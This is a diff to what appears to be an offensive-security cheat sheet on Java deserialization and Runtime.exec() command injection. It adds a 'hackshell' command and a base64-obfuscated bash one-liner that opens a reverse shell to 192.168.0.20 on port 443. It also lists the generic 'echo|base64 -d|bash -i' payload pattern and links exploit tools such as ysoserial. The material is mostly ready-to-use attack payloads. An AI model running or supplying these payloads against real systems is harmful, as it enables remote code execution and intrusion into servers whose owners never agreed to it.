@@ -398,11 +398,16 @@ Contet-Type: text/xml
 
 -> base64 starts with rO0AB in web applications
   
-#### java.lang.Runtime.exec()
+#### Java Lang Runtime Exec - java.lang.Runtime.exec()
   
 bash -c {echo,payload_base64}|{base64,-d}|{bash,-i}  
 https://www.bugku.net/runtime-exec-payloads/
 
+`python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type jlre`  
+```
+bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|{base64,-d}|{bash,-i}
+```
+https://github.com/rodolfomarianocy/hackshell
 #### Tools
 
 https://github.com/frohoff/ysoserial  
